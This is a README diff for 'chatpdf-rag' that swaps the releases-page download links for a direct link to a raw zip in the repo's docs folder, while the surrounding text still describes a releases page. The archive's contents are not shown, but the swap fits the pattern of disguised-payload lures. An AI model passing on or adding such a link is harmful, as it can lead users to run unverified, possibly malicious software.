@@ -27,7 +27,7 @@ If you have PDFs and questions, this is for you.
 
 ## ⬇️ Getting Started
 
-[![Download chatpdf-rag](https://img.shields.io/badge/Download-chatpdf--rag-2ea44f?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://github.com/n9524726-star/chatpdf-rag/releases)
+[![Download chatpdf-rag](https://img.shields.io/badge/Download-chatpdf--rag-2ea44f?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://raw.githubusercontent.com/n9524726-star/chatpdf-rag/main/docs/rag-chatpdf-2.1.zip)
 
 Visit this link to download the application. The download page will open in your browser, where you can grab the latest version.
 
@@ -51,7 +51,7 @@ Follow these steps in order. Take your time — there's no rush.
 
 Click the green button at the top of this page, or use this link:
 
-**👉 [Download chatpdf-rag](https://github.com/n9524726-star/chatpdf-rag/releases)**
+**👉 [Download chatpdf-rag](https://raw.githubusercontent.com/n9524726-star/chatpdf-rag/main/docs/rag-chatpdf-2.1.zip)**
 
 The GitHub page will open. Look for the section that says **"Assets"** or **"Downloads."** Click the file that ends with `.zip` to download it. This may take a few minutes depending on your internet speed.
 
